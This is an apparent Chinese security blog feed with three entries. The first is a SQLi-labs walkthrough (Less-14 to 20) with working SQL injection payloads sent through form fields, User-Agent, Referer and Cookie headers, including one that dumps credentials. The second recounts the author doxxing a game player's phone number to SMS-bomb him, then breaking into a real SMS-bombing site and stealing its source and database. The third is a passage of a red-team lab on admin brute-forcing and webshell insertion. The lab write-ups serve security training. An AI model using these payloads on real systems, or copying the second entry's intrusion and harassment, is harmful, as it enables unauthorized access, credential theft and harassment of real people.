title="Less-14"></a>Less-14</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=&quot;x&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用 双引号 再直接带入 SQL 语句</span><span class="hljs-variable">$uname</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$passwd</span>=<span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>; @<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=<span class="hljs-subst">$uname</span> and password=<span class="hljs-subst">$passwd</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。</p><p>这里不再做重复无意义的记录了。</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-15 注入类型一致，更换对应的闭合方式即可。</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>password = &#39;$passwd&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># uname 参数被过滤了</span><span class="hljs-variable">$uname</span>=check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);  <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username= <span class="hljs-subst">$uname</span> LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> select 结果正确:    <span class="hljs-comment"># 更新语句 使用单引号拼接 passwd</span>    <span class="hljs-variable">$update</span>=<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$row1</span>&#x27;&quot;</span>;    <span class="hljs-keyword">if</span> mysql 报错:            print_r(mysql_error());</code></pre><p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p><pre><code class="hljs Bash">uname=admin&amp;passwd=1<span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&amp;submit=Submit</span></code></pre><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 uagent 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># 对这两个参数进行过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;, <span class="hljs-subst">$uname</span>)&quot;</span>;            输出 <span class="hljs-variable">$uagent</span>;        print_r(mysql_error());    <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p><p>首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-18/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-18/<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/02.png" alt="img"></p><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>VALUES (&#39;$uagent&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-comment"># 获取请求的 referer 和 ip 地址</span><span class="hljs-variable">$uagent</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<span class="hljs-variable">$IP</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-keyword">if</span> 输入了uname 和 passwd:    <span class="hljs-comment"># uname 和 passwd 参数均被过滤</span>    <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);    <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> SQL语句有返回结果:        <span class="hljs-comment"># 单引号拼接后直接带入 insert 语句</span>        <span class="hljs-variable">$insert</span>=<span class="hljs-string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="hljs-subst">$uagent</span>&#x27;, &#x27;<span class="hljs-subst">$IP</span>&#x27;)&quot;</span>;        输出 <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>]        print_r(mysql_error());        <span class="hljs-keyword">else</span>:        print_r(mysql_error());</code></pre><p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p><pre><code class="hljs Http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-19/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: 1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and &#x27;1&#x27;=&#x27;1<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Content-Length</span>: 34uname=admin&amp;passwd=0&amp;submit=Submit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/03.png" alt="img"></p><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$cookee&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>:</p><pre><code class="hljs Php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:      输出了一堆无用的信息    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:        <span class="hljs-comment"># 进行过滤</span>        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>];        <span class="hljs-keyword">if</span> 有查询结果:            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$cookee</span>, time()+<span class="hljs-number">3600</span>);        <span class="hljs-keyword">else</span>:            print_r(mysql_error());<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:        <span class="hljs-variable">$cookee</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;        <span class="hljs-keyword">if</span> 查询无结果:            输出 mysql_error()        <span class="hljs-keyword">if</span> 有结果:            输出查询的信息    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, <span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>], time()<span class="hljs-number">-3600</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关</p><h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /Less-<span class="hljs-number">20</span>/ HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">49</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">49</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=-admin&#x27; union select (select group_concat(username,&#x27;:&#x27;,password+SEPARATOR+<span class="hljs-number">0</span>x<span class="hljs-number">3</span>c<span class="hljs-number">62723</span>e) from users),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">8.8.8.8</span><span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/04.png" alt="img"></p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code class="hljs Http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-20/</span> HTTP/1.1<span class="hljs-attribute">Host</span>: sqli.pl<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Cookie</span>: uname=admin&#x27; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)#<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">X-Forwarded-For</span>: 8.8.8.8<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/SQL%E6%B3%A8%E5%85%A5/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/05.jpg" alt="img"></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。</p>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
      <tag>sqli lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次寻找接口的惨痛经历</title>
    <link href="/p/3b26dc86.html"/>
    <url>/p/3b26dc86.html</url>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。</p><p>可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。</p><p>翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。</p><a id="more"></a><h2 id="故事开始"><a href="#故事开始" class="headerlink" title="故事开始"></a>故事开始</h2><p>很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。</p><p>开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。</p><p>不管三七二十一，把源码和裤子打包到本地慢慢找。</p><h2 id="误导"><a href="#误导" class="headerlink" title="误导"></a>误导</h2><p>在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/01.png" alt="一次寻找接口的惨痛经历"></p><p>不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/02.png" alt="一次寻找接口的惨痛经历"></p><p>就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/03.png" alt="一次寻找接口的惨痛经历"></p><p>切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/04.png" alt="一次寻找接口的惨痛经历"></p><p>就这样，没有头绪了，眼看接口在眼前却解不开。</p><h2 id="误导-1"><a href="#误导-1" class="headerlink" title="误导"></a>误导</h2><p>继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/05.png" alt="一次寻找接口的惨痛经历"></p><p>But，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/06.png" alt="一次寻找接口的惨痛经历"></p><p>然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。</p><p>开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。</p><p>利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。</p><h2 id="继续懵逼"><a href="#继续懵逼" class="headerlink" title="继续懵逼"></a>继续懵逼</h2><p>很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/07.png" alt="一次寻找接口的惨痛经历"></p><p>抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/08.png" alt="一次寻找接口的惨痛经历"></p><p>继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。</p><h2 id="悔恨"><a href="#悔恨" class="headerlink" title="悔恨"></a>悔恨</h2><p>此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/09.png" alt="一次寻找接口的惨痛经历"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>找到了class文件，就进行了反编译，就这样，所有的接口都到手了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20200620_%E4%B8%80%E6%AC%A1%E5%AF%BB%E6%89%BE%E6%8E%A5%E5%8F%A3%E7%9A%84%E6%83%A8%E7%97%9B%E7%BB%8F%E5%8E%86/10.png" alt="一次寻找接口的惨痛经历"></p><p>处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。</p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ATT&amp;CK实战系列——红队实战（一）</title>
    <link href="/p/79decd6.html"/>
    <url>/p/79decd6.html</url>
    
    <content type="html"><![CDATA[<div class="note note-success">            <p>关于内网渗透的学习资源太少了，自己也在恶补这块的知识，文章是看前辈们的文章结合自己的实际操作写的，就当作是笔记吧</p>          </div><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><h3 id="1-1环境搭建测试"><a href="#1-1环境搭建测试" class="headerlink" title="1.1环境搭建测试"></a>1.1环境搭建测试</h3><p>最近想要开始学习内网渗透，搜集了一些教程，准备先实验一个vulnstack靶机，熟悉一下内网渗透操作再学习基础知识。</p><p>靶场下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p>压缩包中的win7为VM1，win2003为VM2，win2008为VM3，拓扑图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/01.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><a id="more"></a><p>win7网络适配器1设置成自定义（VMnet1仅主机模式），网络适配器2设置成NAT模式，</p><p>win2003、win2008 网络适配器设置成自定义（VMnet1仅主机模式）。</p><p>主机默认开机密码都是hongrisec@2019，手动在win7的c盘下开启phpstudy。</p><p>设置完毕后VM1、VM2、VM3就在同一内网中了，只有VM1web服务器能够访问内网，所以要想访问win2008和win2003服务器必须要先拿下win7服务器，用它做跳板进内网进行横向渗透。</p><p>攻击机：kali ip: 192.168.66.130 / 物理机 ip: 192.168.1.101 / CS server IP : 192.168.66.129</p><p>win7 内网ip: 192.168.52.143  外网ip: 192.168.66.128</p><p>win2003 ip: 192.168.52.141</p><p>win2008 ip: 192.168.52.138</p><h3 id="1-2信息收集"><a href="#1-2信息收集" class="headerlink" title="1.2信息收集"></a>1.2信息收集</h3><p> nmap扫一下可以看到win7开放了80端口，访问一下得知是是phpstudy搭建，尝试利用phpstudy后门拿shell，利用失败。开启phpstudy时看了下目录，有yxcms，百度下关于yxcms的漏洞，都是需要后台才可以getshell的。这里也可以通过phpmyadmin来getshell。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/02.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><h2 id="二、漏洞利用（两种getshell方式）"><a href="#二、漏洞利用（两种getshell方式）" class="headerlink" title="二、漏洞利用（两种getshell方式）"></a>二、漏洞利用（两种getshell方式）</h2><h3 id="2-1yxcms后台getshell"><a href="#2-1yxcms后台getshell" class="headerlink" title="2.1yxcms后台getshell"></a>2.1yxcms后台getshell</h3><p>打开默认后台 <a href="http://192.168.66.128/yxcms/index.php?r=admin/index/login">http://192.168.66.128/yxcms/index.php?r=admin/index/login</a> 利用burp爆破，admin 123456 登进后台。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/20200325_ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/03.jpg" alt="ATT&amp;CK实战系列——红队实战（一）"></p><p>在前台模板-&gt;管理模板文件-&gt;index_index.php处编辑，插入一句话木马</p><p><img 